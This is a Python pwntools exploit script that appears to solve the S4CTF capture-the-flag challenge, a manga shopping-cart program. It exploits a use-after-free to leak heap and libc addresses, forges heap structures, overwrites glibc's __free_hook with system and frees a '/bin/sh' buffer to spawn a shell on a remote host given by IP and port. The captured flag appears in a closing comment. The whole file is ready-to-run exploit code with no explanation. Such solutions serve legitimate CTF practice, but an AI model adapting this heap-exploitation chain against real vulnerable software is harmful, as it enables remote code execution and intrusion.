#!/usr/bin/env python3

from pwn import *

def add(mangaIdx, volume, why):
 io.sendlineafter('> ','1')
 io.sendlineafter('Manga id: ',str(mangaIdx))
 io.sendlineafter('Volume: ',str(volume))
 io.sendafter('why are you interested? ',why)

def delete(itemId):
 io.sendlineafter('> ','2')
 io.sendlineafter('> ','y')
 io.sendlineafter('item\'s id: ',str(itemId))

def view():
 io.sendlineafter('> ','2')
 s = io.recvuntil('> ')[:-2]
 io.sendline('n')
 return s

def feedback(size, feedback):
 io.sendlineafter('> ','3')
 io.sendlineafter('size: ',str(size))
 io.sendafter('Feedback: ',feedback)

'''
struct manga {
 uint64_t volumes;
 uint64_t price;
 char* manga_name;
};

UAF # Use After Free

struct cart {
 char str[0x18];
 struct manga* m;
 uint64_t lastInserted;
 uint64_t volume;
 struct cart* next;
 bool isFree;
};
'''

# offsets
unsortedbin_offset = 0x1ebbe0
__free_hook = 0x1eeb28
system = 0x55410

# exp
if __name__ == '__main__':
 io = remote('185.14.184.242', 14990)

 feedback(0x18, 'HK')

 add(1, 0x10, 'HK') #0
 add(1, 0xf, 'HK') #1
 for i in range(18):
  add(1, 0x10, f'HK{i}') #1
 for i in range(20, -1, -1):
  delete(i)

 feedback(0x418, 'HK')
 for i in range(7):
  add(1, 0x10, 'AAAAAAAA')
 feedback(0x78, 'HK')

 add(1, 0xf, p64(0)*2)
 heap_base = u64(view().split(b':')[18].split(b' ')[1] + b'\0\0') - 0x450
 print(f'[*] Heap base: {hex(heap_base)}')

 feedback(0x58, p64(0) * 2 + p64(0x41414141) + p64(0x42424242) + p64(heap_base + 0x4f0))
 delete(0x1b)
 feedback(0x48, p64(0)*3 + p64(heap_base + 0x4a0) + p64(0) + p64(0xf) + p64(0) + p64(0))
 libc_leak = u64(view().split(b' ')[2] + b'\0\0')
 libc_base = libc_leak - unsortedbin_offset
 print(f'[*] Libc base: {hex(libc_base)}')

 fake_structs = [
  #name [0x18], #manga_ptr*
  #idx, #volume,
  #next_ptr*, in_usebit,
  #-, #nextsize,

  b'A'*0x18, heap_base + 0x2e0,
  0x1, 0x10,
  heap_base + 0x540, 0,
  0, 0x51,

  b'A'*0x18, heap_base + 0x2e0,
  2, 0,
  heap_base + 0x590, 0,
  0, 0x51,

  b'A'*0x18, heap_base + 0x2e0,
  3, 0,
  0, 0,
  0, 0x51
 ]
 feedback(0x218, flat(fake_structs,arch='amd64'))
 feedback(0x48, p64(0)*3 + p64(heap_base + 0x2e0) + p64(0) + p64(0xf) + p64(heap_base + 0x4f0) + p64(0))

 delete(2)
 feedback(0x218, b'A'*0x18 +\
  p64(heap_base + 0x2e0) + p64(0x1) +\
  p64(0x10) + p64(0) + p64(0) + p64(0) +\
  p64(0x51) + p64(libc_base + __free_hook - 0x8)
 )
 add(1, 0x10, 'HKHK')
 add(1, 0x10, b'/bin/sh\0' + p64(libc_base + system))
 delete(29)
 io.interactive()
 # cat /home/manga/flag
 # S4CTF{d1d_y0u_3nj0y_y0ur_5h0pp1n6???}
